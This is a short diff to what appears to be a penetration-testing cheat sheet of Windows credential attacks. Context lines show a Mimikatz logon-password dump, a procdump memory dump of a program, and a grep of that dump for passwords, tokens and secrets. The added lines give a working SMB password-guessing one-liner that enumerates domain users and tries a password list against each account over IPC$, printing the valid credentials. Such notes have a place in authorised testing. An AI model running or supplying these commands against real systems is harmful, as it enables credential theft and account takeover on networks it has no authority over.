@@ -41,3 +41,8 @@ sekurlsa::logonPasswords full
 #can also dump from 3rd party program that stores pw
 .\procdump.exe -accepteula -ma <program>.exe <dump>.dmp
 strings <dump>.dmp | grep -iE "auth|login|pass|key|secret|token|"
+
+--# SMB PW GUESSING #--
+#low complexity pass guess attack for SMB on Windows
+net user /domain > listusers.txt
+@FOR /F %p in (passw.txt) DO @FOR /F %n in (listusers.txt) DO @net use \\<SERVERIP>\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\SERVERIP\IPC$ > NUL
